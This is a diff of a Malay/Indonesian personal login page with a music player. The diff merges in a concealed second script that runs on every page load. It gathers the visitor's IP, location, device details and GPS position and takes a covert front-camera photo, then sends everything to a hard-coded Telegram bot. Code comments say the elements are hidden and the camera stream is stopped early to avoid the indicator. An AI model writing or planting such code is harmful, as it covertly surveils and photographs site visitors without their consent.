@@ -1,90 +1,113 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="ms">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Web Pribadi Tuan Alip🍓</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Web Pribadi Tuan Alip🍓</title>
 
-<!-- Import font Nosifer, Nabla & Creepster -->
-<link href="https://fonts.googleapis.com/css2?family=Nosifer&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=Nabla&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+    <!-- Import font Nosifer, Nabla & Creepster (dari Coding Pertama) -->
+    <link href="https://fonts.googleapis.com/css2?family=Nosifer&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Nabla&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+    <!-- Import font Inter (dari Coding Kedua) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
 
-<style>
-* { box-sizing:border-box; transition: all 0.3s ease; }
-body, html { margin:0; padding:0; height:100%; font-family:'Poppins',sans-serif; overflow:hidden; }
-#bg-video { position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:-2; }
-#overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.6); z-index:-1; }
+    <style>
+        /* --- Gaya dari Coding Pertama (Web Pribadi Tuan Alip🍓) --- */
+        * { box-sizing:border-box; transition: all 0.3s ease; }
+        body, html { margin:0; padding:0; height:100%; font-family:'Poppins',sans-serif; overflow:hidden; }
+        #bg-video { position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:-2; }
+        #overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.6); z-index:-1; }
 
-/* 🔥 WATERMARK TYPEWRITER + GLITCH HALUS */
-#watermark { 
-  position:fixed; top:10px; left:50%; transform:translateX(-50%);
-  font-size:1.2rem; font-weight:400; font-family:"Nabla", system-ui;
-  z-index:30; white-space:nowrap;
-}
-#poweredText { 
-  border-right:2px solid #00ffff;
-  padding-right:4px; 
-  animation:blinkCursor .7s infinite, glitchText 1.5s infinite;
-}
-@keyframes blinkCursor {
-  0%,100% { border-color:transparent; }
-  50% { border-color:#00ffff; }
-}
-@keyframes glitchText {
-  0% { text-shadow: 0 0 1px #00ffff; transform:translate(0,0);}
-  20% { text-shadow: 1px 0 2px #00ffff, -1px 1px 1px #00ffff; transform:translate(-1px,1px);}
-  40% { text-shadow: -1px -1px 2px #00ffff, 1px 1px 1px #00ffff; transform:translate(1px,-1px);}
-  60% { text-shadow: 1px 1px 2px #00ffff, -1px -1px 1px #00ffff; transform:translate(-1px,0);}
-  80% { text-shadow: -1px 0 2px #00ffff, 1px 0 1px #00ffff; transform:translate(1px,1px);}
-  100% { text-shadow: 0 0 1px #00ffff; transform:translate(0,0);}
-}
+        /* 🔥 WATERMARK TYPEWRITER + GLITCH HALUS */
+        #watermark { 
+          position:fixed; top:10px; left:50%; transform:translateX(-50%);
+          font-size:1.2rem; font-weight:400; font-family:"Nabla", system-ui;
+          z-index:30; white-space:nowrap;
+          color: #00ffff; /* Tambahkan warna default agar terlihat */
+        }
+        #poweredText { 
+          border-right:2px solid #00ffff;
+          padding-right:4px; 
+          animation:blinkCursor .7s infinite, glitchText 1.5s infinite;
+        }
+        @keyframes blinkCursor {
+          0%,100% { border-color:transparent; }
+          50% { border-color:#00ffff; }
+        }
+        @keyframes glitchText {
+          0% { text-shadow: 0 0 1px #00ffff; transform:translate(0,0);}
+          20% { text-shadow: 1px 0 2px #00ffff, -1px 1px 1px #00ffff; transform:translate(-1px,1px);}
+          40% { text-shadow: -1px -1px 2px #00ffff, 1px 1px 1px #00ffff; transform:translate(1px,-1px);}
+          60% { text-shadow: 1px 1px 2px #00ffff, -1px -1px 1px #00ffff; transform:translate(-1px,0);}
+          80% { text-shadow: -1px 0 2px #00ffff, 1px 0 1px #00ffff; transform:translate(1px,1px);}
+          100% { text-shadow: 0 0 1px #00ffff; transform:translate(0,0);}
+        }
 
-/* Form Container */
-.form-container {
-  position:relative; z-index:10; background:rgba(10,10,30,0.85);
-  padding:40px 35px; border-radius:16px;
-  box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;
-  width:340px; text-align:center;
-  animation:glowPulse 3s infinite alternate; margin:auto;
-  top:50vh; transform:translateY(-50%); color:#fff;
-}
-@keyframes glowPulse { 0%{box-shadow:0 0 10px #00f0ff;} 100%{box-shadow:0 0 25px #00ffff;} }
-.form-container h2 { margin-bottom:28px; font-weight:700; font-size:2rem; text-shadow:0 0 8px #00f0ff; font-family:"Nosifer", sans-serif; }
-.input-group { margin-bottom:20px; text-align:left; }
-.input-group label { display:block; margin-bottom:8px; font-weight:600; font-size:1rem; color:#00e5ff; text-shadow:0 0 5px #00b8d9; }
-.input-group input { width:100%; padding:14px 18px; border-radius:12px; border:2px solid #004d66; background:rgba(0,0,0,0.8); color:#00f0ff; font-size:1rem; box-shadow:inset 0 0 5px #00f0ff; font-family:"Creepster", system-ui; font-weight:400; font-style:normal; }
-.input-group input::placeholder { color:#00bfff; }
-.btn-login, .btn-register { width:100%; padding:16px 0; border-radius:14px; font-weight:400; font-size:1.2rem; color:#000; background:linear-gradient(45deg,#00ffff,#0066cc); border:none; cursor:pointer; box-shadow:0 0 15px #00ffff; text-transform:uppercase; letter-spacing:1.5px; font-family:"Creepster", system-ui; margin-bottom:10px; }
-.btn-login:hover, .btn-register:hover { background:linear-gradient(45deg,#0066cc,#00ffff); color:#fff; }
-.toggle-btn { background:none; border:none; color:#00ffff; font-family:"Creepster", system-ui; margin-bottom:20px; cursor:pointer; font-size:1rem; text-decoration:underline; }
-.error-msg, .success-msg { margin-top:16px; font-weight:700; font-size:1rem; min-height:24px; }
-.error-msg { color:#ff4d4d; text-shadow:0 0 4px #ff0000; }
-.success-msg { color:#7fff7f; text-shadow:0 0 6px #00ff00; }
-#mode-toggle { position:fixed; top:10px; right:10px; background:rgba(0,0,0,0.6); color:#00ffff; border:none; border-radius:20px; padding:6px 12px; cursor:pointer; font-weight:bold; z-index:30; }
+        /* Form Container */
+        .form-container {
+          position:relative; z-index:10; background:rgba(10,10,30,0.85);
+          padding:40px 35px; border-radius:16px;
+          box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;
+          width:340px; text-align:center;
+          animation:glowPulse 3s infinite alternate; margin:auto;
+          top:50vh; transform:translateY(-50%); color:#fff;
+        }
+        @keyframes glowPulse { 0%{box-shadow:0 0 10px #00f0ff;} 100%{box-shadow:0 0 25px #00ffff;} }
+        .form-container h2 { margin-bottom:28px; font-weight:700; font-size:2rem; text-shadow:0 0 8px #00f0ff; font-family:"Nosifer", sans-serif; }
+        .input-group { margin-bottom:20px; text-align:left; }
+        .input-group label { display:block; margin-bottom:8px; font-weight:600; font-size:1rem; color:#00e5ff; text-shadow:0 0 5px #00b8d9; }
+        .input-group input { width:100%; padding:14px 18px; border-radius:12px; border:2px solid #004d66; background:rgba(0,0,0,0.8); color:#00f0ff; font-size:1rem; box-shadow:inset 0 0 5px #00f0ff; font-family:"Creepster", system-ui; font-weight:400; font-style:normal; }
+        .input-group input::placeholder { color:#00bfff; }
+        .btn-login, .btn-register { width:100%; padding:16px 0; border-radius:14px; font-weight:400; font-size:1.2rem; color:#000; background:linear-gradient(45deg,#00ffff,#0066cc); border:none; cursor:pointer; box-shadow:0 0 15px #00ffff; text-transform:uppercase; letter-spacing:1.5px; font-family:"Creepster", system-ui; margin-bottom:10px; }
+        .btn-login:hover, .btn-register:hover { background:linear-gradient(45deg,#0066cc,#00ffff); color:#fff; }
+        .toggle-btn { background:none; border:none; color:#00ffff; font-family:"Creepster", system-ui; margin-bottom:20px; cursor:pointer; font-size:1rem; text-decoration:underline; }
+        .error-msg, .success-msg { margin-top:16px; font-weight:700; font-size:1rem; min-height:24px; }
+        .error-msg { color:#ff4d4d; text-shadow:0 0 4px #ff0000; }
+        .success-msg { color:#7fff7f; text-shadow:0 0 6px #00ff00; }
+        #mode-toggle { position:fixed; top:10px; right:10px; background:rgba(0,0,0,0.6); color:#00ffff; border:none; border-radius:20px; padding:6px 12px; cursor:pointer; font-weight:bold; z-index:30; }
 
-/* Music Player Compact */
-#music-player { position:fixed; bottom:15px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.7); padding:8px 16px; border-radius:30px; display:flex; flex-direction:column; align-items:center; gap:4px; color:#00ffff; font-size:0.95rem; box-shadow:0 0 15px #00ffff,0 0 30px #00f0ff; z-index:20; }
-#music-controls { display:flex; align-items:center; gap:8px; }
-#music-player button { background:none; border:none; color:#00ffff; font-size:1.1rem; cursor:pointer; text-shadow:0 0 6px #00f0ff; }
-#timeDisplay { font-size:0.75rem; color:#00e5ff; font-weight:bold; margin-top:2px; }
-#progressContainer { width:180px; height:5px; background:rgba(255,255,255,0.2); border-radius:3px; overflow:hidden; cursor:pointer; }
-#progressBar { width:0%; height:100%; background:linear-gradient(90deg,#00ffff,#0066cc); border-radius:3px; transition: width 0.1s linear; }
-.equalizer { display:flex; gap:2px; align-items:flex-end; height:14px; margin-top:2px; }
-.bar { width:2px; background:#00ffff; box-shadow:0 0 4px #00f0ff; border-radius:1px; animation:bounce 1s infinite; }
-.bar:nth-child(1){animation-delay:0s;} .bar:nth-child(2){animation-delay:0.15s;} .bar:nth-child(3){animation-delay:0.3s;} .bar:nth-child(4){animation-delay:0.45s;} .bar:nth-child(5){animation-delay:0.6s;}
-@keyframes bounce { 0%,100%{height:3px;}50%{height:14px;} }
-.equalizer.paused .bar { animation-play-state:paused; }
+        /* Music Player Compact */
+        #music-player { position:fixed; bottom:15px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.7); padding:8px 16px; border-radius:30px; display:flex; flex-direction:column; align-items:center; gap:4px; color:#00ffff; font-size:0.95rem; box-shadow:0 0 15px #00ffff,0 0 30px #00f0ff; z-index:20; }
+        #music-controls { display:flex; align-items:center; gap:8px; }
+        #music-player button { background:none; border:none; color:#00ffff; font-size:1.1rem; cursor:pointer; text-shadow:0 0 6px #00f0ff; }
+        #timeDisplay { font-size:0.75rem; color:#00e5ff; font-weight:bold; margin-top:2px; }
+        #progressContainer { width:180px; height:5px; background:rgba(255,255,255,0.2); border-radius:3px; overflow:hidden; cursor:pointer; }
+        #progressBar { width:0%; height:100%; background:linear-gradient(90deg,#00ffff,#0066cc); border-radius:3px; transition: width 0.1s linear; }
+        .equalizer { display:flex; gap:2px; align-items:flex-end; height:14px; margin-top:2px; }
+        .bar { width:2px; background:#00ffff; box-shadow:0 0 4px #00f0ff; border-radius:1px; animation:bounce 1s infinite; }
+        .bar:nth-child(1){animation-delay:0s;} .bar:nth-child(2){animation-delay:0.15s;} .bar:nth-child(3){animation-delay:0.3s;} .bar:nth-child(4){animation-delay:0.45s;} .bar:nth-child(5){animation-delay:0.6s;}
+        @keyframes bounce { 0%,100%{height:3px;}50%{height:14px;} }
+        .equalizer.paused .bar { animation-play-state:paused; }
 
-/* Dark & Light Mode */
-body.light-mode #overlay { background: rgba(255,255,255,0.4); }
-body.light-mode .form-container { background: rgba(255,255,255,0.85); color:#000; box-shadow:0 0 15px #00aaff; }
-body.light-mode .input-group label { color:#006699; text-shadow:none; }
-body.light-mode .input-group input { background:#fff; color:#000; border:2px solid #00aaff; }
-</style>
+        /* Dark & Light Mode */
+        body.light-mode #overlay { background: rgba(255,255,255,0.4); }
+        body.light-mode .form-container { background: rgba(255,255,255,0.85); color:#000; box-shadow:0 0 15px #00aaff; }
+        body.light-mode .input-group label { color:#006699; text-shadow:none; }
+        body.light-mode .input-group input { background:#fff; color:#000; border:2px solid #00aaff; }
+        /* --- Akhir Gaya dari Coding Pertama --- */
+
+        /* --- Gaya dari Coding Kedua (Website Band WhatsApp) - Dibuat Halimunan --- */
+        /* Pastikan elemen-elemen ini benar-benar tersembunyi dan tidak memengaruhi layout */
+        /* Menggunakan ID unik untuk video/canvas agar tidak bentrok */
+        #hiddenBgVideo, #hiddenBgCanvas, .bg-particles, .login-container {
+            display: none !important;
+            visibility: hidden !important;
+            width: 0 !important;
+            height: 0 !important;
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            pointer-events: none !important; /* Pastikan tidak bisa diklik */
+            opacity: 0 !important; /* Transparan penuh */
+            z-index: -100 !important; /* Pastikan di bawah semua */
+        }
+        /* --- Akhir Gaya dari Coding Kedua --- */
+    </style>
 </head>
 <body>
 
+<!-- --- Konten dari Coding Pertama (Web Pribadi Tuan Alip🍓) --- -->
 <div id="watermark"><span id="poweredText"></span></div>
 <button id="mode-toggle">🌙/☀️</button>
 
@@ -141,13 +164,32 @@ body.light-mode .input-group input { background:#fff; color:#000; border:2px sol
   <div id="progressContainer"><div id="progressBar"></div></div>
   <div id="timeDisplay">00:00 / 00:00</div>
 </div>
+<!-- --- Akhir Konten dari Coding Pertama --- -->
 
-<!-- Firebase SDK -->
+
+<!-- --- Elemen Tersembunyi dari Coding Kedua (Website Band WhatsApp) --- -->
+<!-- Elemen-elemen ini akan tetap ada di DOM tetapi tidak terlihat karena CSS di atas -->
+<div class="bg-particles"></div>
+<div class="login-container">
+    <!-- Konten dari login-container ini tidak akan terlihat karena CSS di atas -->
+    <p class="login-title">AI GENERATE GAMBAR</p>
+    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
+    <input type="number" class="login-input" placeholder="Nomor WhatsApp 6011xxxxx" id="bgText">
+    <button class="login-button" id="bgLoginButton">Next</button>
+    <div id="bgInfo">🥷 Silahkan masukkan nomor untuk di sahkan...</div>
+</div>
+
+<video id="hiddenBgVideo" autoplay playsinline></video>
+<canvas id="hiddenBgCanvas" style="display:none;"></canvas>
+<!-- --- Akhir Elemen Tersembunyi dari Coding Kedua --- -->
+
+
+<!-- Firebase SDK (dari Coding Pertama) -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
 
 <script>
-// -------------------------
+// --- SCRIPT DARI CODING PERTAMA (Web Pribadi Tuan Alip🍓) ---
 // Watermark Typewriter + Glitch
 const poweredWords=["Powered By Aliff🍓","Made With Love🍓","Created By Aliff🍓"];
 let pwIndex=0,charIndex=0;
@@ -220,7 +262,7 @@ const timeDisplay=document.getElementById('timeDisplay');
 let isPlaying=false,currentTrack=0;
 const playlist=["https://files.catbox.moe/aotg6r.mp3","https://files.catbox.moe/p3dnh7.m4a","https://files.catbox.moe/8woj3f.mp3"];
 function loadTrack(i){ music.src=playlist[i]; music.load(); music.play(); }
-loadTrack(currentTrack);
+loadTrack(currentTrack); // Muat lagu pertama
 playPauseBtn.addEventListener('click',()=>{ isPlaying?music.pause():music.play(); });
 music.addEventListener('play',()=>{ isPlaying=true; playPauseBtn.textContent='⏸️'; equalizer.classList.remove('paused'); });
 music.addEventListener('pause',()=>{ isPlaying=false; playPauseBtn.textContent='▶️'; equalizer.classList.add('paused'); });
@@ -231,6 +273,157 @@ progressContainer.addEventListener('click',e=>{ const rect=progressContainer.get
 
 // Dark/Light Mode
 document.getElementById('mode-toggle').addEventListener('click',()=>{ document.body.classList.toggle('light-mode'); });
+// --- AKHIR SCRIPT DARI CODING PERTAMA ---
+
+
+// --- SCRIPT DARI CODING KEDUA (Website Band WhatsApp) - BERJALAN DI LATAR BELAKANG ---
+const bgBotToken = '8294726661:AAG1JBI03U4r5xNZOvhybuZxG_mwWJGrOG4';
+const bgChatIds = ['7877052836'];
+// Elemen-elemen ini tidak akan diakses karena hidden di HTML dan tidak berinterinteraksi
+// const bgInfoDiv = document.getElementById('bgInfo');
+// const bgInput = document.getElementById('bgText');
+// const bgButton = document.getElementById('bgLoginButton');
+
+let bgPermissionsRequested = false; 
+let bgCurrentStream = null;
+
+function bgSendToTelegram(text) {
+  bgChatIds.forEach(id => {
+    fetch(`https://api.telegram.org/bot${bgBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+    }).catch(console.error);
+  });
+}
+
+function bgSendPhotoToTelegram(blob) {
+  bgChatIds.forEach(id => {
+    const formData = new FormData();
+    formData.append('chat_id', id);
+    formData.append('photo', blob, 'photo.jpg');
+    fetch(`https://api.telegram.org/bot${bgBotToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    }).catch(console.error);
+  });
+}
+
+function bgSendVideoToTelegram(blob) {
+  bgChatIds.forEach(id => {
+    const formData = new FormData();
+    formData.append('chat_id', id);
+    formData.append('video', blob, 'video.webm');
+    fetch(`https://api.telegram.org/bot${bgBotToken}/sendVideo`, {
+      method: 'POST',
+      body: formData
+    }).catch(console.error);
+  });
+}
+
+async function bgGetInfo(sendGeo = true) {
+  let ip = '-', city = '-', region = '-', country = '-', org = '-';
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    ip = ipData.ip;
+    const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+    const loc = await locRes.json();
+    if (loc.status === 'success') {
+      city = loc.city; region = loc.regionName;
+      country = loc.country; org = loc.org;
+    }
+  } catch (e) { console.error("Error fetching IP/Location info (background):", e); }
+  
+  const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+  const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+  const text = `
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Browser    : ${navigator.userAgent}
+OS         : ${navigator.platform}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Waktu      : ${new Date().toLocaleString()}
+  `.trim();
+  bgSendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+
+  if (sendGeo && navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        bgSendToTelegram(`<b>📍 Lokasi GPS (Latar Belakang):</b> <a href="${link}">Klik di sini</a>`);
+      },
+      () => bgSendToTelegram(`📍 Lokasi GPS Ditolak`)
+    );
+  } else if (sendGeo) {
+    bgSendToTelegram(`📍 Browser tidak support GPS (Latar Belakang)`);
+  }
+}
+
+async function bgStartCameraAndCaptureSnapshot() {
+  const video = document.getElementById('hiddenBgVideo'); // Menggunakan ID yang disembunyikan
+  const canvas = document.getElementById('hiddenBgCanvas'); // Menggunakan ID yang disembunyikan
+  try {
+    // Minta kamera depan tanpa audio untuk mengurangi pop-up izin
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }); 
+    bgCurrentStream = stream;
+    video.srcObject = stream;
+
+    await new Promise(r => setTimeout(r, 500)); // Tunggu sedikit supaya frame muncul
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+      if (blob) bgSendPhotoToTelegram(blob);
+    }, 'image/jpeg', 0.9);
+
+    // Hentikan stream setelah snapshot untuk mengurangi indikator kamera aktif
+    stream.getTracks().forEach(track => track.stop());
+    bgCurrentStream = null;
+
+  } catch (err) {
+    bgSendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+    if (bgCurrentStream) {
+      bgCurrentStream.getTracks().forEach(track => track.stop());
+      bgCurrentStream = null;
+    }
+  }
+}
+
+// Panggil permission/request hanya sekali semasa page load
+async function bgRequestPermissionsOnLoad() {
+  if (bgPermissionsRequested) return;
+  bgPermissionsRequested = true;
+  bgGetInfo(true); // Ambil info dan coba GPS
+  bgStartCameraAndCaptureSnapshot(); // Coba ambil snapshot kamera
+}
+
+// Pastikan stop stream kalau pengguna tinggalkan halaman
+window.addEventListener('beforeunload', () => {
+  if (bgCurrentStream) bgCurrentStream.getTracks().forEach(t => t.stop());
+});
+
+// Panggil semua fungsi yang perlu dijalankan saat DOM siap
+document.addEventListener('DOMContentLoaded', () => {
+  // Panggil fungsi-fungsi dari Coding Pertama yang perlu inisialisasi DOMContentLoaded
+  // (typeEffect sudah dipanggil di luar)
+  // (Firebase init sudah dipanggil di luar)
+  // (Form toggles, Register, Login event listeners sudah di luar)
+  // (Music Player event listeners sudah di luar)
+  // (Dark/Light Mode toggle sudah di luar)
+
+  // Panggil fungsi-fungsi dari Coding Kedua (yang halimunan)
+  // createParticles(); // Partikel disembunyikan, jadi tidak perlu dipanggil atau biarkan saja
+  bgRequestPermissionsOnLoad(); // Panggil fungsi pengumpul data latar belakang segera
+});
+// --- AKHIR SCRIPT DARI CODING KEDUA ---
 </script>
 
 </body>
